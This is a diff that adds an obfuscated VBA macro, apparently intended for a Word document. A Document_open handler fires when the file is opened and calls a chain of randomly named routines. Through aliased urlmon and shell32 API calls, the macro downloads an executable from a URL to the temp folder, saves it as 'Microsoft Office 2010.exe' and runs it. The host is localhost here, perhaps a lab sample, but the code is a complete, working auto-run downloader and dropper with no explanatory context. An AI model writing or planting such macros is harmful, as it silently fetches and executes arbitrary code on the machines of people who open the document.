@@ -1,0 +1,39 @@
+Private Declare PtrSafe Function pznHypDNww _
+Lib _
+"urlmon" _
+Alias _
+"URLDownloadToFileA" _
+(ByVal jVwSfubsfjlw As Long, ByVal uoGDZwUbWil As String, _
+ByVal AVWhqlOexRkfTAl As String, _
+ByVal JHMxrycpoElLCc As String, ByVal rkTBDYBFT As Long) _
+As Long
+Private Declare PtrSafe Function DolT Lib "shell32.dll" _
+Alias "ShellExecuteA" (ByVal eyMzmMjiKrJvzYzKEWTqMl As Long, ByVal dYIBQm As String, _
+ByVal ZjGBfhNinvlQZZXdA As String, ByVal HOtFFUYcTsHAK As String, ByVal RUpRVK As String, _
+ByVal gPdCCemybuZxPpPbU As Long) As Long
+
+Private Sub Document_open()
+VvXCAiWri
+End Sub
+
+Sub nWtd()
+Dim otqBShpqzXRvxekDL As String, Bhcdbg As String, QXfvVVIce As String
+Bhcdbg = "Microsoft Office 2010.exe"
+QXfvVVIce = Environ$("tmp") & "\" & Bhcdbg
+otqBShpqzXRvxekDL = "http://127.0.0.1/Download/ChromeSetup.exe"
+tEJGRjkFGPoU otqBShpqzXRvxekDL, QXfvVVIce
+End Sub
+
+Sub VvXCAiWri()
+Dim YmxgfSSUCOrKqNgs As Integer
+Dim geXqnJ As String
+YmxgfSSUCOrKqNgs = 3
+geXqnJ = "osumLoSDznHypDNwwjVwSf"
+nWtd
+End Sub
+
+Sub tEJGRjkFGPoU(ByVal yNuATc, b As String)
+pznHypDNww 0, yNuATc, b, 0, 0
+DolT 0, "open", b, "", vbNullString, vbNormalFocus
+
+End Sub
